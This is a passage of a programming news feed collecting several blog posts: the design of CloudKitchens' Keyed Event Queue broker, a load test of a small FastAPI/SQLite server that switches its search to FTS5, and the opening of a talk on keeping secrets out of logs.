time-sensitive, typically involving 3rd party integrations with varying characteristics. If an order contains multiple items, each has to be </span><a href="https://techblog.citystoragesystems.com/p/food-prep-time-prediction">prepared at the right time</a><span>. If an order is prepared in a facility with </span><a href="https://techblog.citystoragesystems.com/p/robotic-order-conveyance">conveyance robots</a><span>, it requires additional coordination. Our internal systems listen to a central order event message bus to understand and react to the state of orders in real time. Lost updates or long delays result in a poor experience for both kitchens and customers.</span></p><p>The nature of order processing presents some unique challenges. To this end, we designed the Keyed Event Queue (KEQ) service as a central message bus for order processing. Today, all orders and order related events flow through the system alongside other internal traffic at CloudKitchens.</p><p><span>Order processing is inherently reactive. Our software systems observe and interact with the physical world, where progress is driven by real-world events, for instance, &ldquo;customer places an order&rdquo;, &ldquo;order ready to pick up&rdquo;, &ldquo;driver arrives&rdquo;, &ldquo;item removed from locker&rdquo;, etc. Event-driven systems are commonly structured around an asynchronous, durable message bus, managed by a </span><em>message broker</em><span>.&nbsp;</span></p><p>The CloudKitchens order processing system follows this approach:</p><div><figure><a href="https://substackcdn.com/image/fetch/$s_!K3Ay!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde3f2b8d-cf59-451f-a2c1-5dc1ba0fc5f2_2730x408.png"></a><figcaption>The event-driven &ldquo;message bus&rdquo; architecture</figcaption></figure></div><p>Orders transition through a dozen or more events as part of fulfillment, some of which are generated internally by our systems or devices. Each consumer service is responsible for a distinct aspect of fulfillment, such as ticket printing or robot conveyance, and reacts to order updates for that purpose. Order progress is driven by events and actions in concert with each other and the physical world. Many thousands of orders are typically in progress simultaneously.</p><p><span>In our kitchens, timeliness and event ordering are important. We originally used </span><a href="https://kafka.apache.org/">Apache Kafka</a><span>, a widely-used, open-source message broker that offers total event ordering with high performance. Kafka is a standard solution.</span></p><p>However, as order volume grew, our systems started to run afoul of how Kafka works and what it is designed to do well. First, the distinctly heterogeneous order processing frequently involves 3rd party integrations with at times transient failures or delays. Second, our software stack is stretched across multiple regions to overcome regional cloud provider failures. Neither works well with Kafka or similar message brokers.</p><p><span>With Kafka, the order processing message bus is represented as a </span><em>topic</em><span>. A topic acts as a queue where emitted events are delivered to each consumer in the same order. Kafka scales its parallel processing by dividing topics into a fixed number of distributed queues called </span><em>partitions</em><span>. Each message provides a key that determines its partition. Event ordering is preserved within partitions. With N partitions, up to N consumer instances can process events concurrently.</span></p><p>Although events are processed concurrently across partitions, each partition still contains the events of thousands of different interleaved orders. And because a partition is processed sequentially (with batching), failure to process any event blocks further progress for the whole partition. This situation is known as Head-of-Line (HOL) blocking.</p><div><figure><a href="https://substackcdn.com/image/fetch/$s_!Kxt-!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5fd3783-7e83-493c-9355-e72eca25f532_1476x341.png"></a><figcaption>Interleaved order updates for two orders, illustrating HOL blocking on a shared Kafka partition</figcaption></figure></div><p>The big question is: if a consumer fails or is slow to process an event, what do we do?</p><p><span>For </span><em>time-sensitive</em><span> processing, there are no good simple options. We can wait for event processing to succeed, but that may take a while, during which all later events in the partition are stalled. Or we can ignore the message and move on, which avoids the delay but may fail to act on something important. Either option leads to poor experiences and order cancellations.</span></p><p>To mitigate HOL blocking, consumers must defer failing or slow events one way or another. A common option is to move problematic events to another topic, a so-called Dead-Letter-Queue (DLQ), for later processing. A DLQ ensures progress without losing events.</p><p>However, a DLQ introduces other problems: for example, it breaks event ordering when postponed events are processed later than intended. And for transient failures or delays, when exactly should we give up? If we give up too quickly, then even small disruptions create outsized ordering inversions. If too slowly, then processing is still delayed. Such logic is hard to get right when seconds matter. And how do we handle slow or failing DLQ events?</p><p>A DLQ works best when it is immediately apparent that an event is &ldquo;dead&rdquo; and has no hope of being processed, such as corrupt or invalid data records. This is indeed the case for a large number of Kafka uses. But for order processing it is not quite so simple.</p><p>The reality with HOL blocking is that time-sensitive processing involves complicated failure handling. While using a DLQ is a standard solution, it is a solution for another problem. However, since HOL blocking is a consequence of partition mechanics, what if we designed a system to avoid it?</p><p>Keyed Event Queue (KEQ) is a new message broker based on a deceptively simple idea to avoid HOL blocking: instead of using N permanent partitions, use a separate, temporary partition for every message key. It is the exact ordering we ultimately want for orders: the events of each order are in sequence, but separate orders can progress independently. HOL blocking is then a non-issue, because the scope of each partition is a single order.</p><div><figure><a href="https://substackcdn.com/image/fetch/$s_!3t2p!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe1c48f8e-a074-4881-9fa6-855c3d17fc3f_1476x848.png"></a><figcaption>Three independent orders in KEQ without HOL blocking despite event processing failures</figcaption></figure></div><p>There are additional benefits to this design. Standard techniques for handling transient errors apply, such as retries with exponential backoff. Potentially slow actions can be performed synchronously. Consumer logic &ndash; especially failure handling &ndash; becomes far simpler. The problems brought by time-sensitive processing and fixed partitions are largely gone.</p><p>In addition, there is no N to pick and adjust for the number of partitions as order volume grows. The number of partitions is dynamically determined by the data.</p><p>The primary tradeoff with this design is that bookkeeping becomes expensive. Where progress is tracked by a small, fixed number of partition cursors in Kafka for each consumer, KEQ requires millions of such cursors to keep track of the individual progress of each order. Consumers are thereby comparatively heavyweight.</p><p>For order processing, neither tradeoff is an issue. Moreover, consumers are almost always caught up and it is desirable that a new event for an order can be sent immediately and processed individually.</p><p>KEQ is a multi-region, high-performance and scalable message broker for managing a large number of independent strictly-ordered message queues. It provides an at-least-once ordered delivery guarantee as well as a processing exclusivity guarantee with explicit leases. For consumers, this means that events are delivered in order with no other consumer instances trying to process the same event. This is important when consumer actions involve slow non-idempotent side effects.</p><p>KEQ uses an active-active, multi-region distributed SQL database to store messages, cursors, and metadata. That choice makes a tradeoff: it ensures KEQ can honor its guarantees even during a regional cloud provider outage, but I/O latency is necessarily higher than a single-region database.&nbsp;</p><p><span>For performance, KEQ maintains authoritative, sharded in-memory state for each topic using our internal </span><a href="https://techblog.citystoragesystems.com/p/easy-as-pie-stateful-services-at">Work Distribution Service</a><span>. It allows KEQ to track progress and deliver new messages without reading from the database; order and progress updates can be blind writes. New messages are briefly cached and then evicted once all consumers have processed them, usually within seconds.</span></p><div><figure><a href="https://substackcdn.com/image/fetch/$s_!C5ff!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe48eb28e-ca9a-4995-b2a8-5dde2f24cfa4_1120x704.png"></a><figcaption>Serving post-commit messages from the authoritative in-memory cache</figcaption></figure></div><p>KEQ also optimizes its internal communication, a necessity for low-latency multi-region services. Internally, each topic is divided into key ranges with an explicit region. These key ranges are dynamically assigned by the Work Distribution Service to KEQ instances in their region, so that database operations may benefit from region-locality.</p><p>When a consumer instance connects to KEQ, it is internally assigned to specific ranges and a streaming connection is made to each range owner. New and pending messages are thereafter streamed to the consumer, typically from memory and otherwise from the database if it has fallen too far behind.</p><p>In addition to topic ranges, KEQ runs an exclusive global leader responsible for allocating and load-balancing ranges between connected consumers. For instance, if two consumer instances are connected, each is assigned half of the ranges while taking into account which ranges are closest to each consumer. This work allocation is dynamic as instances come and go and factors in both region-affinity and node-affinity to minimize delivery latency.</p><div><figure><a href="https://substackcdn.com/image/fetch/$s_!DhJX!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fef0249f7-cee2-41d6-8fe7-4199beaa6c56_1792x633.png"></a><figcaption>Dynamic allocation of Ranges respecting region and node affinity</figcaption></figure></div><p>The centralized dynamic allocation simplifies the operational model. Consumer instances are ephemeral and need no individual configuration or coordination; they simply connect to make themselves available. Work is assigned to whatever consumers are present. Wide consumer failures and fast up-scaling are handled equally naturally.</p><p>As a result, KEQ works well with auto-scaled multi-region consumers.</p><p>KEQ is built for reliable real-time order processing in adverse conditions. Its active-active multi-region design offers elastic scalability without manual regional failover, explicit re-partitioning or temporary ordering violations. Order event consumers can freely scale up or down to match the rhythm of the restaurant business.</p><p>KEQ&rsquo;s main value is in simplifying how consumers handle failure, transforming failures into delays. With no HOL blocking, consumers can retry transient failures indefinitely without impacting other orders. A DLQ is not needed. Processing failures &ndash; and how they are overcome &ndash; is handled inline. Even consumer code bugs can be fixed in a reasonable time, which lets consumers sidestep complex failure-handling and detection in favor of a trivial retry.&nbsp;</p><p>For widespread system failures, HOL blocking does not matter because no processing will succeed. But consumer code, in practice, never knows which kind of failure is happening, yet it must make a real-time decision. KEQ simplifies that decision. And as Dijkstra put it, "Simplicity is prerequisite for reliability".</p></div></article></div><div class="gallery"><p><img src="https://substackcdn.com/image/fetch/$s_!CEif!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F56c3cbf7-ac4a-4def-9492-7126dda97c78_900x599.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!K3Ay!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde3f2b8d-cf59-451f-a2c1-5dc1ba0fc5f2_2730x408.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!Kxt-!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb5fd3783-7e83-493c-9355-e72eca25f532_1476x341.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!3t2p!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe1c48f8e-a074-4881-9fa6-855c3d17fc3f_1476x848.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!C5ff!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe48eb28e-ca9a-4995-b2a8-5dde2f24cfa4_1120x704.png"></p><p><img src="https://substackcdn.com/image/fetch/$s_!DhJX!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fef0249f7-cee2-41d6-8fe7-4199beaa6c56_1792x633.png"></p></div></section>]]></description><pubDate>Tue, 09 Sep 2025 22:04:11 +0530</pubDate></item><item><link>https://blog.epsiolabs.com/i-love-uuid-i-hate-uuid</link><title>I love UUID, I hate UUID (blog.epsiolabs.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1ncht77/i_love_uuid_i_hate_uuid/</guid><comments>https://www.reddit.com/r/programming/comments/1ncht77/i_love_uuid_i_hate_uuid/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 1 min | <a href='https://www.reddit.com/r/programming/comments/1ncht77/i_love_uuid_i_hate_uuid/'>Post permalink</a></p></section><section class='preview-image'><img src='https://blog.epsiolabs.com/api/og/post?og=eyJ0aXRsZSI6IkklMjBsb3ZlJTIwVVVJRCUyQyUyMEklMjBoYXRlJTIwVVVJRCIsImF1dGhvciI6Ik1hb3IlMjBLZXJuIiwiZG9tYWluIjoiYmxvZy5lcHNpb2xhYnMuY29tIiwicGhvdG8iOiJodHRwczovL2Nkbi5oYXNobm9kZS5jb20vcmVzL2hhc2hub2RlL2ltYWdlL3VwbG9hZC92MTczNjQ0OTc1MDE5Ny8wMzU5YjBkNC1iYzIzLTRjMDAtODE4Zi0zM2JlN2ZiYjBkNjIucG5nIiwiYmdjb2xvciI6IiNmMWYyZjYiLCJyZWFkVGltZSI6Nn0=' /></section><section class='parsed-content'><div><p>Vercel Security Checkpoint</p><p>|</p><p>bom1::1757437374-6sa9o22QC2d5wOkKXHjcaEiqF0yACM9x</p></div></section>]]></description><pubDate>Tue, 09 Sep 2025 18:10:41 +0530</pubDate></item><item><link>https://rafaelviana.com/posts/hug-of-death</link><title>Can a tiny server running FastAPI/SQLite survive the hug of death? (rafaelviana.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1ncan42/can_a_tiny_server_running_fastapisqlite_survive/</guid><comments>https://www.reddit.com/r/programming/comments/1ncan42/can_a_tiny_server_running_fastapisqlite_survive/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 8 min | <a href='https://www.reddit.com/r/programming/comments/1ncan42/can_a_tiny_server_running_fastapisqlite_survive/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>I run tiny indie apps on a Linux box. On a good day, I get ~300 visitors. But what if I hit a lot of traffic? Could my box survive the <em>hug of death</em>?</p><p>So I load tested it:</p><ul><li>Reads? 100 RPS with no errors.</li><li>Writes? Fine after enabling WAL.</li><li>Search? Broke… until I switched to SQLite FTS5.</li></ul></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://rafaelviana.com/preview.png?v=5' /></section><section class='parsed-content'><div><p>I build indie applications of very modest size.<br> On a good day, one of my posts might do alright on Reddit and send me ~300 visitors.</p><p>But what if I actually made it to Reddit&rsquo;s <strong>front page</strong>?<br> Could my humble box - 1 CPU core and 2 GB of RAM - handle the dreaded <em>hug of death</em>?</p><p>Let&rsquo;s find out:</p><hr> <h2>My Reality Check ($12 Box)</h2> <ul> <li><strong>Specs:</strong> 1 CPU core, 2 GB RAM, 50 GB storage</li> <li><strong>Stack:</strong> Python (FastAPI), HTMX, SQLite</li> <li><strong>Cost:</strong> $12/month</li> </ul><p>This isn&rsquo;t a Kubernetes cluster. It&rsquo;s not a microservices playground.<br> It&rsquo;s one small VPS where all my apps live.</p><hr> <h2>Constraints</h2><p>To keep this experiment honest, I set some rules:</p><ul> <li><strong>No upgrades</strong> - no extra CPU/RAM.</li> <li><strong>No language switch</strong> - no C++/Rust.</li> <li><strong>No database swap</strong> - SQLite stays.</li> </ul><p>The challenge is to see what my David can do against Goliath (Reddit).</p><hr> <h2>What Really Matters</h2><p>Total visitors per day doesn&rsquo;t tell you much.<br> What matters is how many requests hit your server <strong>at the same time</strong> &mdash; the bursts.</p><p>Not American sniper - more like John Wick avenging his dog.</p><hr> <h3>From RPS to Users</h3><p>Assuming a typical web user makes 1 request every 10&ndash;30 seconds (&asymp;0.05&ndash;0.1 RPS per user).</p><p>If my server can handle <strong>100 requests per second (RPS):</strong> that translates to about 1,000&ndash;2,000 simultaneous users.</p><p><span><span><span><math><semantics><mrow><mtext>Simultaneous&nbsp;users</mtext><mo>&asymp;</mo><mfrac><mn>100</mn><mrow><mn>0.05</mn><mtext>&nbsp;to&nbsp;</mtext><mn>0.1</mn></mrow></mfrac><mo>=</mo><mn>1,000</mn><mtext>&ndash;</mtext><mn>2,000</mn></mrow><annotation>\text{Simultaneous users} \approx \frac{100}{0.05 \text{ to } 0.1} = 1{,}000 \text{&ndash;} 2{,}000</annotation></semantics></math></span></span></span></p><p>That&rsquo;s the ballpark.</p><hr> <h2>The Test Setup</h2><p>To keep it simple, I used a <strong>tiny CRUD app</strong> as the guinea pig. It covers all the basic operations:</p><ul> <li><strong>Read</strong>: load homepage entries</li> <li><strong>Search</strong>: run queries</li> <li><strong>Write</strong>: add a new entry</li> </ul><p>For load testing, I used <strong><a href="https://github.com/codesenberg/bombardier">bombardier</a></strong> from my laptop, pointing at my live server. <img src="https://rafaelviana.com/assets/blog/htop1.png" alt="Page 4 / 20 connections, CPU barely moving"></p><hr> <h2>First Test: 100 RPS</h2><p>The big question: can my $12 box hold steady under <strong>100 requests per second</strong>, the rough equivalent of 1,000&ndash;2,000 simultaneous users?</p><p><strong>Observation</strong></p><ul> <li>Avg latency: ~140&ndash;160 ms</li> <li>CPU: ~60%</li> <li>No errors</li> </ul><p><strong>Interpretation</strong><br> At 100 RPS, the box didn&rsquo;t break a sweat. This suggests that for reads and simple pages, the $12 server could realistically handle front-page Reddit traffic in bursts.</p><hr> <h2>Search: Where Things Break</h2><p>When I hit <code>/search?q=fastapi</code> with 100 RPS, the picture changed:</p><p><strong>Observation</strong></p><ul> <li>Avg latency: ~174 ms</li> <li>CPU: pegged at 100%</li> <li>Some slowdown under load <img src="https://rafaelviana.com/assets/blog/htop3.png" alt="Page 1 / 200 connections, /search?q=fastapi, CPU pinned 100%"></li> </ul><p><strong>Interpretation</strong><br> Search is the bottleneck. Heavy queries push the CPU to its limit, meaning this is where the $12 box would choke under front-page load.</p><hr> <table> <thead> <tr> <th>Test</th> <th>RPS Target</th> <th>Avg Latency</th> <th>CPU Usage</th> <th>Outcome</th> </tr> </thead> <tbody> <tr> <td>Homepage (Idle)</td> <td>1 RPS</td> <td>~158 ms</td> <td>11%</td> <td>Stable</td> </tr> <tr> <td>Homepage (Burst)</td> <td>100 RPS</td> <td>~140 ms</td> <td>60%</td> <td>Still holding</td> </tr> <tr> <td>Search (Burst)</td> <td>100 RPS</td> <td>~174 ms</td> <td>100%</td> <td>Bottleneck found</td> </tr> </tbody> </table><p>I'm a CRUD monkey. And this app reflects the majority of my apps. A simple get, a tiny write (INSERT + COMMIT) + search (usually it&rsquo;s LIKE <code>%term%</code> on a text column).</p><p>It makes sense for the search to be the problem. SQLite&rsquo;s B-tree index can&rsquo;t help when you search <code>%term%</code>. It has to scan rows one by one.</p><p>So I reached for SQLite&rsquo;s secret weapon: FTS5. It gives you a full-text index, turning those full scans into fast lookups.</p><h2>Make search fast: switch to FTS5</h2><p>FTS5 gives you an inverted index; queries become index lookups instead of table scans.</p><p>What I had:</p><pre><code><span><span>@app<span>.</span>get</span><span>(</span><span>"/search"</span><span>,</span> response_class<span>=</span>HTMLResponse<span>)</span> </span><span><span>def</span> <span>search</span><span>(</span>request<span>:</span> Request<span>,</span> q<span>:</span> <span>str</span> <span>=</span> <span>""</span><span>)</span><span>:</span> </span><span> con <span>=</span> get_db<span>(</span><span>)</span> </span><span> results <span>=</span> <span>[</span><span>]</span> </span><span> <span>if</span> q<span>:</span> </span><span> results <span>=</span> con<span>.</span>execute<span>(</span> </span><span> <span>"SELECT * FROM entries WHERE content LIKE ? ORDER BY created_at DESC LIMIT 20"</span><span>,</span> </span><span> <span>(</span><span><span>f"%</span><span><span>{</span>q<span>}</span></span><span>%"</span></span><span>,</span><span>)</span><span>,</span> </span><span> <span>)</span><span>.</span>fetchall<span>(</span><span>)</span> </span><span> con<span>.</span>close<span>(</span><span>)</span> </span><span> <span>return</span> templates<span>.</span>TemplateResponse<span>(</span> </span><span> <span>"search.html"</span><span>,</span> <span>{</span><span>"request"</span><span>:</span> request<span>,</span> <span>"results"</span><span>:</span> results<span>,</span> <span>"q"</span><span>:</span> q<span>}</span> </span><span> <span>)</span> </span></code></pre><p>After migrating the DB to FTS5 and updating the search endpoint:</p><pre><code><span><span>@app<span>.</span>get</span><span>(</span><span>"/search"</span><span>,</span> response_class<span>=</span>HTMLResponse<span>)</span> </span><span><span>def</span> <span>search</span><span>(</span>request<span>:</span> Request<span>,</span> q<span>:</span> <span>str</span> <span>=</span> Query<span>(</span><span>.</span><span>.</span><span>.</span><span>,</span> min_length<span>=</span><span>2</span><span>,</span> max_length<span>=</span><span>64</span><span>)</span><span>)</span><span>:</span> </span><span> tokens <span>=</span> <span>[</span>t <span>for</span> t <span>in</span> q<span>.</span>split<span>(</span><span>)</span> <span>if</span> t<span>]</span> </span><span> <span>match</span> <span>=</span> <span>" "</span><span>.</span>join<span>(</span><span><span>f"</span><span><span>{</span>t<span>}</span></span><span>*"</span></span> <span>for</span> t <span>in</span> tokens<span>)</span> <span># prefix search</span> </span><span> con <span>=</span> get_db<span>(</span><span>)</span> </span><span> rows <span>=</span> con<span>.</span>execute<span>(</span><span>""" </span></span><span><span> SELECT e.* </span></span><span><span> FROM entries_fts f </span></span><span><span> JOIN entries e ON e.id = f.rowid </span></span><span><span> WHERE f.entries_fts MATCH ? </span></span><span><span> ORDER BY e.created_at DESC </span></span><span><span> LIMIT 20 </span></span><span><span> """</span><span>,</span> <span>(</span><span>match</span><span>,</span><span>)</span><span>)</span><span>.</span>fetchall<span>(</span><span>)</span> </span><span> con<span>.</span>close<span>(</span><span>)</span> </span><span> <span>return</span> templates<span>.</span>get_template<span>(</span><span>"search.html"</span><span>)</span><span>.</span>render<span>(</span>request<span>=</span>request<span>,</span> results<span>=</span>rows<span>,</span> q<span>=</span>q<span>)</span> </span></code></pre><p><strong>Before</strong>: At 100 RPS, search pegged CPU and fell apart with 5xx errors.</p><p><strong>After FTS5 + WAL</strong>: At 100 RPS, search ran clean with ~200 ms latency, 0 errors, and steady throughput.</p><h2>Lessons for Indie Hackers</h2> <ul> <li>Reads are cheap, search is expensive.</li> <li>SQLite is fine, just don&rsquo;t abuse LIKE <code>%term%</code>.</li> <li>WAL mode prevents "DB locked" pain.</li> <li>A $12 box can take a Reddit punch &mdash; you don&rsquo;t need Kubernetes for your MVP.</li> </ul> <h2>Outro</h2><p>Ok, David can take a punch - about 2,000 simultaneous users</p><p>Will it survive thousands more - say 5,000&ndash;25,000 of simultaneous users raw (no caching)? <strong>Absolutely not</strong>.</p><p>But with Nginx micro-caching or a CDN in front - and decent SQL under the hood - even a $12 box can shrug off traffic that looks terrifying on paper.</p><p>For indie hackers, the lesson is simple: <strong>don&rsquo;t overcomplicate &mdash; test your box, fix the bottlenecks, and ship</strong>.</p><p><a href="https://github.com/vianarafael/CheapBoxBench">The Repo, tests, and logs</a></p></div></section>]]></description><pubDate>Tue, 09 Sep 2025 11:01:39 +0530</pubDate></item><item><link>https://allan.reyes.sh/posts/keeping-secrets-out-of-logs/</link><title>Keeping secrets out of logs (allan.reyes.sh)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbvi5u/keeping_secrets_out_of_logs/</guid><comments>https://www.reddit.com/r/programming/comments/1nbvi5u/keeping_secrets_out_of_logs/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 50 min | <a href='https://www.reddit.com/r/programming/comments/1nbvi5u/keeping_secrets_out_of_logs/'>Post permalink</a></p></section><section class='preview-image'><img src='https://allan.reyes.sh/img/ksool/title.jpg' /></section><section class='parsed-content'><p><strong>tl;dr:</strong> There's no silver bullet, but if we put some "lead" bullets in the right places, we have a good shot at keeping sensitive data out of logs.</p><section><br><div><p><em>"This is the blog version of a talk I gave at LocoMocoSec 2024. It&rsquo;s mostly a lightly edited transcript with some screenshots, so if you&rsquo;d prefer, you can watch the <a href="https://slideslive.com/39021794/keeping-secrets-out-of-logs">video</a> or just flip through the <a href="https://allan.reyes.sh/pdf/ksool.pdf">slides</a>."</em></p></div><hr><p>This post is about how to keep secrets out of logs, and my claim is that <em>(like many things in security)</em> there isn&rsquo;t a singular action or silver bullet that lets you do this. I would go so far as to say that there&rsquo;s not even an 80/20 rule, where one action fixes 80% of the problem. It&rsquo;s not like preventing SQL injection with prepared statements or preventing buffer overflows by using memory-safe languages.</p><p>What I will offer instead, are lead bullets, of which there are many. I&rsquo;m going to talk about 10 of them. They are imperfect and sometimes unreliable things that, if put in the right places and with defense-in-depth, can still give us a real good chance at succeeding. My hope is that by the end, you&rsquo;ll have a slightly better framework for how to reason about this problem and some new ideas to add to your kit.</p><p>Table of contents:</p><ul><li><a href="https://allan.reyes.sh#the-problem">The Problem</a></li><li><a href="https://allan.reyes.sh#causes">Causes</a><ul><li><a href="https://allan.reyes.sh#-direct-logging">&#129318; Direct logging</a></li><li><a href="https://allan.reyes.sh#-kitchen-sinks">&#128688; Kitchen sinks</a></li><li><a href="https://allan.reyes.sh#-configuration-changes">&#128295; Configuration changes</a></li><li><a href="https://allan.reyes.sh#-embedded-secrets">&#129383; Embedded secrets</a></li><li><a href="https://allan.reyes.sh#-telemetry">&#128225; Telemetry</a></li><li><a href="https://allan.reyes.sh#-user-input">&#128378;&#127995; User input</a></li></ul></li><li><a href="https://allan.reyes.sh#fixes-lead-bullets">Fixes (lead bullets)</a><ul><li><a href="https://allan.reyes.sh#-data-architecture">&#128208; Data architecture</a></li><li><a href="https://allan.reyes.sh#-data-transformations">&#127838; Data transformations</a></li><li><a href="https://allan.reyes.sh#-domain-primitives">&#129704; Domain primitives</a><ul><li><a href="https://allan.reyes.sh#compile-time">Compile-time</a></li><li><a href="https://allan.reyes.sh#run-time">Run-time</a></li><li><a href="https://allan.reyes.sh#run-time-part-deux">Run-time: part deux</a></li></ul></li><li><a href="https://allan.reyes.sh#-read-once-objects">&#127873; Read-once objects</a></li><li><a href="https://allan.reyes.sh#-taint-checking">&#128270; Taint checking</a><ul><li><a href="https://allan.reyes.sh#awesome">Awesome</a></li><li><a href="https://allan.reyes.sh#not-awesome">Not awesome</a></li></ul></li><li><a href="https://allan.reyes.sh#%EF%B8%8F-log-formatters">&#128451;&#65039; Log formatters</a></li><li><a href="https://allan.reyes.sh#-unit-tests">&#129514; Unit tests</a></li><li><a href="https://allan.reyes.sh#%EF%B8%8F-sensitive-data-scanners">&#128373;&#65039; Sensitive data scanners</a><ul><li><a href="https://allan.reyes.sh#sampling">Sampling</a></li></ul></li><li><a href="https://allan.reyes.sh#-log-pre-processors">&#129302; Log pre-processors</a></li><li><a href="https://allan.reyes.sh#-people">&#129464; People</a></li><li><a href="https://allan.reyes.sh#recap">Recap</a></li></ul></li><li><a href="https://allan.reyes.sh#strategy">Strategy</a><ul><li><a href="https://allan.reyes.sh#0-lay-the-foundation">0. Lay the foundation</a></li><li><a href="https://allan.reyes.sh#1-understand-the-data-flow">1. Understand the data flow</a></li><li><a href="https://allan.reyes.sh#2-protect-at-chokepoints">2. Protect at chokepoints</a></li><li><a href="https://allan.reyes.sh#3-apply-defense-in-depth">3. Apply defense-in-depth</a></li><li><a href="https://allan.reyes.sh#4-plan-for-response-and-recovery">4. Plan for response and recovery</a></li></ul></li><li><a href="https://allan.reyes.sh#conclusion">Conclusion</a></li></ul><h2>The Problem</h2><p>With that, let&rsquo;s dive in and set the table by talking about the problem with secrets in logs.</p><p>So, there are some problems that are annoying. And there are some problems that are difficult.</p><center><img alt="Meme: two red buttons labeled annoying and difficult being pressed" src="https://allan.reyes.sh/img/ksool/buttons.jpg"></center><p>This is both. I&rsquo;m gonna level with you: I absolutely hate this problem. But I&rsquo;m not going to gaslight you and tell you that this is the most important thing to work on worry about, because it probably isn&rsquo;t!</p><p>You have somewhere between 5 and 50 other problems in your backlog that seem more important, 1 of which you found out about this morning. But I think it&rsquo;s likely that none of those problems are nearly as annoying. While researching this topic, I interviewed about a dozen other engineers and, on this point, they unanimously agreed! Nobody likes dealing with secrets in logs because it is extraordinarily <em>annoying</em>.</p><p>This is a problem that&rsquo;s also difficult, but not even in the fun sense, like being technically complex or interesting. Once you catch sensitive data in logs, it&rsquo;s usually pretty straightforward <em>(at least in retrospect)</em> to determine how they got there. But, it&rsquo;s also surprisingly elusive to prevent, and it crops up in incredibly unexpected places and ways.</p><p>Secrets could mean lots of different things to lots of different teams, but I&rsquo;ll use it interchangeably with &ldquo;sensitive data&rdquo;: stuff that you want to keep confidential. What&rsquo;s <em>so</em> frustrating when breaching confidentiality in logs is the full spectrum of potential impact.</p><p>In the best case <em>(left)</em>, you might log an isolated, internal credential, like an API key, which <em>(kudos!)</em> you rotate right after fixing the source of leak. The impact is minimal, and you just move on. Of course, all the way on the other end of the spectrum <em>(right)</em>, you might log something that an attacker or inside threat could use to do some <em>real harm</em>.</p><p>And then somewhere in-between, where I suspect most of the incidents lie. You might log secrets that you unfortunately, can&rsquo;t rotate yourself. Things like PII or your customer&rsquo;s passwords, which are reused on other sites, because of course they are. And, depending on your policies, threat model, or regulations, you might choose to issue a disclosure or notification.</p><p>And it is painful.</p><center><img alt="a knight in full armor with an arrow labeled LOGS entering the visor" src="https://allan.reyes.sh/img/ksool/knight.jpg"></center><p>You could be doing so many good data security practices, like secure-by-design frameworks, database and field-level encryption, zero-touch production, access control&hellip; but logging bypasses all of that&hellip; and ultimately degrades trust, in your systems and in your company. It feels unfair because it&rsquo;s only a fraction of your security story.</p><p>And this is a problem that happens to companies of all sizes:</p><center><img alt="A screenshot of a Twitter/X blog post in 2018 about log leakage" src="https://allan.reyes.sh/img/ksool/x.jpg"></center><center><img alt="A screenshot of a Google blog post in 2019 about log leakage" src="https://allan.reyes.sh/img/ksool/google.jpg"></center><center><img alt="A screenshot of Krebs on Security in 2019 about Facebook log leakage" src="https://allan.reyes.sh/img/ksool/facebook.jpg"></center><p>Something about &ldquo;plaintext&rdquo; just kinda stings, especially as a security practitioner. It&rsquo;s like&hellip; the most profane insult you can hurl at a security engineer. Imagine retorting with, <em>&ldquo;Oh yea? Well, you store your passwords in plaintext!&rdquo;</em></p><p>But logging passwords and storing them in plaintext are&hellip; kinda the same thing.</p><center><img alt="Meme: same picture" src="https://allan.reyes.sh/img/ksool/samepicture.jpg"></center><p>Because while logs are rarely or purposefully public, they&rsquo;re typically afforded broader access than direct access to your databases.</p><p>Everyone knows by now that storing plaintext secrets in your database is a terrible idea. Logs, however, are still data-at-rest, and we should treat them with the same level of scrutiny.</p><p>I cherry picked those examples because they are established companies with very mature security programs. I&rsquo;m not trying to throw shade; in fact, I deeply respect them for being public and transparent about this. I think this also hints that preventing secrets in logs is a deceptively difficult and frustrating problem.</p><p>If we can understand some causes, we might gain a deeper appreciation for these past occurrences, and stand a better chance at avoiding new incidents in the future.</p><h2>Causes</h2><p>This is certainly not comprehensive, but from my interviews and personal experience, here are <strong>six</strong> of the most common causes.</p><ol><li>&#129318; <a href="https://allan.reyes.sh#-direct-logging">Direct logging</a></li><li>&#128688; <a 